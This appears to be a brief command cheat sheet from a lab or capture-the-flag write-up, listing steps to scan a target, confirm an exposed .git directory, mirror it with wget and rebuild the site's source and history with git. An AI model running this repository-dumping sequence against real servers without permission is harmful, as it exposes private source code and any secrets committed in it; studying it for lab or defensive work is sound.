## Quick Reference — Commands Used

```bash
# Port scan
nmap -sV <target-ip>

# Confirm .git/ is exposed
curl -s http://TARGET:8080/.git/HEAD

# Dump the full repository
wget --mirror -nH -P repodump http://TARGET:8080/.git/

# Restore working tree from git objects
cd repodump
git checkout .

# Inspect history
git log --oneline
git log -p
```

